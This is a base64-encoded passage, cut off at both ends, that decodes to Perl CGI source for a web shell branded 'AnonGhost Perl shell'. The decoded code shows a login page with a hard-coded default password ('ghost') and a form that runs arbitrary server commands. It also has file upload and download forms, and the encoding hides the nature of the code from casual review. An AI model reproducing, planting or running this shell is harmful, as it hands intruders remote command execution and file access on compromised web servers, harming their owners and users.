2U7DQoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+QW5vbkdob3N0IFBlcmwgc2hlbGw8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQoNCjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJBbm9uR2hvc3QsQW5vbkdob3N0LEFub25HaG9zdC5pbmZvLGhhY2tlciI+DQo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iQW5vbkdob3N0LEFub25HaG9zdCxBbm9uR2hvc3QuaW5mbyxoYWNrZXIiPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiNGRkZGRkYiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCIgdGV4dD0iI0ZGMDAwMCI+DQo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4NCjx0cj4NCjx0ZCBiZ2NvbG9yPSIjRkZGRkZGIiBib3JkZXJjb2xvcj0iI0ZGRkZGRiIgYWxpZ249ImNlbnRlciIgd2lkdGg9IjElIj4NCjxiPjxmb250IHNpemU9IjIiPiM8L2ZvbnQ+PC9iPjwvdGQ+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgd2lkdGg9Ijk4JSI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+PGI+IA0KPGIgc3R5bGU9ImNvbG9yOmJsYWNrO2JhY2tncm91bmQtY29sb3I6I2ZmZmY2NiI+QW5vbkdob3N0IFBlcmwgc2hlbGw8L2I+IENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYmdjb2xvcj0iI0ZGRkZGRiI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+DQoNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlVwbG9hZCBGaWxlPC9mb250PjwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+RG93bmxvYWQgRmlsZTwvZm9udD48L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRpc2Nvbm5lY3Q8L2ZvbnQ+PC9hPiB8DQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgc2l6ZT0iMyI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCgkkTWVzc2FnZSA9IHEkPHByZT48aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vaW1nODEwLmltYWdlc2hhY2sudXMvaW1nODEwLzgwNDMvQW5vbkdob3N0MTIucG5nIj48L3ByZT48YnI+PGJyPjwvZm9udD48aDE+RGVmYXVsdCBQYXNzd29yZD1naG9zdDwvaDE+DQokOw0KIycNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQpUcnlpbmcgJFNlcnZlck5hbWUuLi48YnI+DQpDb25uZWN0ZWQgdG8gJFNlcnZlck5hbWU8YnI+DQpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dDQo8Y29kZT4kTWVzc2FnZQ0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5GYWlsZWRNZXNzYWdlDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxicj5sb2dpbjogYWRtaW48YnI+DQpwYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCjwvZm9udD4NCjxmb250IHNpemU9IjMiPg0KbG9naW46IDxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmNjYiPkFub25HaG9zdCBQZXJsIHNoZWxsPC9iPjxicj4NCnBhc3N3b3JkOjwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCIgc2l6ZT0iMyI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCg0KCSZQcmludExvZ2luU2NyZWVuOw0KCSZQcmludExvZ2luRm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJCSZQcmludExvZ2luU2NyZWVuOw0KCQlpZigkTG9naW5QYXNzd29yZCBuZSAiIikgIyBzb21lIHBhc3N3b3JkIHdhcyBlbnRlcmVkDQoJCXsNCgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KCQl9DQoJCSZQcmludExvZ2luRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgY29tbWFuZHMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6Jm5ic3A7Jm5ic3A7Jm5ic3A7PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlwcmludCA8PEVORDsNCjwveG1wPg0KDQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQpFTkQNCgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCgl7DQoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQoJCQ0KCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsNCgkJY2hvcCgkQ3VycmVudERpciA9IGAkQ29tbWFuZGApOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJE9sZERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRPbGREaXJdXCQgIjsNCgkJcHJpbnQgIiRQcm9tcHQgJFJ1bkNvbW1hbmQiOw0KCX0NCgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJCXByaW50ICIkUHJvbXB0ICRSdW5Db21tYW5kPHhtcD4iOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQoJCWlmKCEkV2luTlQpDQoJCXsNCgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJCX0NCgkJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCQl7DQoJCQkkfD0xOw0KCQkJJENvbW1hbmQgLj0gIiB8IjsNCgkJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQkJew0KCQkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJCXByaW50ICIkX1xuIjsNCgkJCX0NCgkJCSR8PTA7DQoJCX0NCgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJCXsNCgkJCXByaW50IGAkQ29tbWFuZGA7DQoJCX0NCgkJaWYoISRXaW5OVCkNCgkJew0KCQkJYWxhcm0oMCk7DQoJCX0NCgkJcHJpbnQgIjwveG1wPiI7DQoJfQ0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoDQojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNClNlbmRpbmcgRmlsZSAkVHJhbnNmZXJGaWxlLi4uPGJyPg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPi4NCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3N